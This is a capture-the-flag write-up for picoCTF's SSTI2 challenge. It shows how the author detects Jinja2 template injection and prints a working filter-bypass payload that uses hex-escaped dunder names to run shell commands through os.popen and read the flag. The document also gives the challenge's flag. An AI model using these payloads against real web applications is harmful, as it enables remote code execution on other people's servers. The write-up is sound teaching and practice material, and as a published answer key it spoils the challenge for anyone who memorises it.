# SSTI2 (Server Side Template Injection) (medium)


# Flag

`picoCTF{sst1_f1lt3r_byp4ss_a9824e27}`
# Solve

* First lets read about SSTI here : https://portswigger.net/web-security/server-side-template-injection

- ur allowed to input anything into the website's text box


- i used this payload : `{{3*3}}` which evaluated into `9`. this means we can inject code into the server and it will evauluate so it looks like `jinja` or `twig` is being used as the template engine.


- tried some other payloads from - https://github.com/payloadbox/ssti-payloads

- but we keep getting internal server error.


- i found a better repo : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

- now that we know its jinja2 or twig i tried a lot of payloads from a lot of resources and found out what all symbols are blacklisted. 

- Blocked Characters:

```
.

|

_

[]

|join
```

after a lot of searching for payloads without these symbols and reading a lot of websites like :

- https://onsecurity.io/article/server-side-template-injection-with-jinja2/

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

- https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
- https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation


- I finally found a working payload in this website : 

-  https://onsecurity.io/article/server-side-template-injection-with-jinja2/

- `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('cat flag')()}}
`

this payload finally worked and i got RCE : 

![alt text](assets/rceJinja2.png)

now lets cat the flag : 

```js
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

The flag :  `picoCTF{sst1_f1lt3r_byp4ss_a9824e27}`




